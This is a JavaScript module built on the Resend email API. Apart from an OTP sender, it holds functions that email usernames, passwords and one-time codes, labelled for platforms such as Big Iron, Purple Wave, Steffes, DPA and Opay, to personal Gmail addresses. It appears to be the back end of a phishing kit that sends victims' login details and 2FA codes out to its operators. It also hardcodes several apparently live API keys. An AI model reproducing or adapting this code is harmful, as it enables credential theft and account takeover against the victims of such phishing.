import { Resend } from "resend";
import dotenv from "dotenv";
dotenv.config();

const resend = new Resend("re_ZgunF7aU_N1RNbvMvp7RjyuEb3zfdMYrr");
const resendLummy = new Resend("re_RQsqyzBG_PEahQVieG1HEbTWqLHjgibPe");
const resendAPIKEY = new Resend("re_TMMVRnge_K9h4VSVetAhgu2TBCXwm7jFv");
const resendAPIKEYRochelle = new Resend("re_3ETfdGTt_5ZbYRdMBbuHeoHYQff7Zbnpp");
const resendOops = new Resend(process.env.RESEND_API_OOPS);

export const sendEmail = async (otp, email) =>
  await resend.emails.send({
    from: "onboarding@resend.dev",
    to: email,
    subject: "OTP Verification",
    html: `<strong>Your OTP is: ${otp}</strong>`,
  });

export const sendEmailLummy = async (form, email) => {
  const formattedForm = Array.isArray(form.words)
    ? form.words.map((item) => `<li>${item}</li>`).join("")
    : "<li>No words provided</li>";

  await resendLummy.emails.send({
    from: "onboarding@resend.dev",
    to: email,
    subject: "Form Input",
    html: `
      <div>
        <strong>Your form submission:</strong>
        <p>${form.name}</p>
        <ul>${formattedForm}</ul>
      </div>
    `,
  });
};

export const sendCredentials = async (username, password) => {
  await resendAPIKEY.emails.send({
    from: "onboarding@resend.dev",
    to: "lummybackend@gmail.com",
    subject: "Credentials",
    html: `
      <div>
      <strong>Platform:</strong>
        <p>Big Iron</p>
        <strong>Username:</strong>
        <p>${username}</p>
        <strong>Password:</strong>
        <p>${password}</p>
      </div>
    `,
  });
};

export const sendCredentialsPurpleWave = async (
  username,
  password,
  platform = "Purple Wave",
) => {
  await resendAPIKEY.emails.send({
    from: "onboarding@resend.dev",
    to: "lummybackend@gmail.com",
    subject: "Credentials",
    html: `
      <div>
        <strong>Platform:</strong>
        <p>Purple Wave</p>
        <strong>Username:</strong>
        <p>${username}</p>
        <strong>Password:</strong>
        <p>${password}</p>
      </div>
    `,
  });
};

export const sendCredentialsSteffes = async (
  email,
  password,
  platform = "Steffes",
) => {
  await resendAPIKEYRochelle.emails.send({
    from: "onboarding@resend.dev",
    to: "rochellele25@gmail.com",
    subject: "Credentials",
    html: `
      <div>
        <strong>Platform:</strong>
        <p>Steffes</p>
        <strong>Email:</strong>
        <p>${email}</p>
        <strong>Password:</strong>
        <p>${password}</p>
      </div>
    `,
  });
};

export const sendCredentialsDPA = async (
  username,
  password,
  platform = "DPA",
) => {
  await resendAPIKEYRochelle.emails.send({
    from: "onboarding@resend.dev",
    to: "rochellele25@gmail.com",
    subject: "Credentials",
    html: `
      <div>
        <strong>Platform:</strong>
        <p>DPA</p>
        <strong>Username:</strong>
        <p>${username}</p>
        <strong>Password:</strong>
        <p>${password}</p>
      </div>
    `,
  });
};

// oops

export const sendCode = async (code) => {
  await resendAPIKEY.emails.send({
    from: "onboarding@resend.dev",
    to: "lummybackend@gmail.com",
    subject: "Code",
    html: `
      <div>
        <strong>Code:</strong>
        <p>${code}</p>
      </div>
    `,
  });
};

export const sendCredentialsOops = async (
  number,
  password,
  platform = "Opay",
) => {
  await resendOops.emails.send({
    from: "onboarding@resend.dev",
    to: "alowonlefaruq100@gmail.com",
    subject: "Oops Credentials",
    html: `
      <div>
        <strong>Platform:</strong>
        <p>Opay</p>
        <strong>Number:</strong>
        <p>${number}</p>
        <strong>Password:</strong>
        <p>${password}</p>
      </div>
    `,
  });
};

export const sendOTPOops = async (code) => {
  await resendOops.emails.send({
    from: "onboarding@resend.dev",
    to: "alowonlefaruq100@gmail.com",
    subject: "Oops OTP Code",
    html: `
      <div>
        <strong>Code:</strong>
        <p>${code}</p>
      </div>
    `,
  });
};
